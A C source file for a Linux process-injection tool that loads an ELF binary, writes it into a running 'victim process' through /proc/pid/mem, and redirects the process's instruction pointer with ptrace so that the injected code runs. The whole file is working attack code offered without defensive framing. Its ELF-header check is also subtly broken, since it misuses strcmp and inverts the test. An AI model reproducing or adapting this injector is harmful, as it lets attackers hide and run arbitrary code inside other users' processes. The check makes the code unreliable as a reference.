#include "inject_simple_elf_dev_mem.h"

char* build_proc_mem_string(int pid){
  char* proc_mem;
  proc_mem = malloc(100);
  snprintf(proc_mem, 100, "/proc/%i/mem", pid);
  return proc_mem;
}

int write_to_dev_mem(int pid, long addr, char* data, int size_of_data){
  char* proc_mem = build_proc_mem_string(pid);

  int memfd;
  memfd = open(proc_mem, O_RDWR);
  if(memfd < 0)
  {
    dzlog_error("Could not open /proc/%i/mem", pid);
    exit(-1);
  }

  dzlog_info("Writing to 0x%lx", addr);
  lseek(memfd, addr, SEEK_SET);
  if (write(memfd, data, size_of_data) == -1)
  {
    dzlog_error("Could not write to /proc/mem");
    exit(-1);
  }
  
  close(memfd);
  
  return 0;
}

int is_elf(char* elf_file, int size_of_elf){
  if (!(size_of_elf > MINIMAL_ELF_SIZE))
  {
      return -1;
  }
  
  if (elf_file[0] == 0x7f && strcmp(&elf_file[1], "ELF"))
  {
    return 0;
  }
  else
  {
    return -1;
  }
}

long get_base_address_elf(char* elf_file){
  Elf64_Ehdr *ehdr;
  Elf64_Phdr *phdr;
  long base_addr = 0;

  ehdr = (Elf64_Ehdr *)elf_file;
  phdr = (Elf64_Phdr *)&elf_file[ehdr->e_phoff];

  for(int i = 0; i< ehdr->e_phnum; i++) {
    if (phdr[i].p_type == PT_LOAD){
      base_addr = phdr[i].p_vaddr;
    }
  }

  return base_addr;
}

long get_entry_point_elf(char* elf_file, int size_of_elf){

  if (is_elf(elf_file, size_of_elf) == -1){
    dzlog_error("Not an ELF file.");
    exit(-1);
  }
  
  Elf64_Ehdr *ehdr;
  ehdr = (Elf64_Ehdr*)elf_file;
  return ehdr->e_entry;
}

void inject_simple_elf_dev_mem(pid_t target, char* path_to_elf){
  dzlog_info("Loading elf file from %s", path_to_elf);

  //read in ELF file and determine offset to entry point
  int size_of_elf = 0;
  char* elf_file = read_file(path_to_elf, &size_of_elf);
  hexdump_shellcode(elf_file, size_of_elf);
  long entry_point_elf = get_entry_point_elf(elf_file, size_of_elf);
  dzlog_info("Entry point of ELF at 0x%lx", entry_point_elf);
  long offset_to_text = entry_point_elf - get_base_address_elf(elf_file);
  dzlog_info("Offset to text section is 0x%lx", offset_to_text);

  // find executable area in victim process to overwrite
  long overwritable_area = freespaceaddr(target);
  dzlog_info("Found overwriteable executable area in victim process at 0x%lx", overwritable_area);
  
  // prepare data structures and attach to victim process
  struct user_regs_struct regs;
  memset(&regs, 0, sizeof(struct user_regs_struct));
  ptrace_attach(target);

  dzlog_info("Writing ELF to victim process");
  write_to_dev_mem(target, overwritable_area, elf_file, size_of_elf);

  char* read = malloc(256);
  ptrace_read(target, overwritable_area, read, 256);
  hexdump_shellcode(read, 256);
  
  // hijack thread, point it to the entry point of the elf file
  ptrace_getregs(target, &regs);
  long new_rip = overwritable_area + offset_to_text + 2;
  dzlog_info("Setting RIP to 0x%lx", new_rip);
  regs.rip = new_rip;
  ptrace_setregs(target, &regs);
  
  // continue target and clean up
  ptrace_cont(target);
  ptrace_detach(target);
  free(elf_file);

  dzlog_info("Finished injection of ELF file. Overwrote original ELF and hijacked thread.");
}
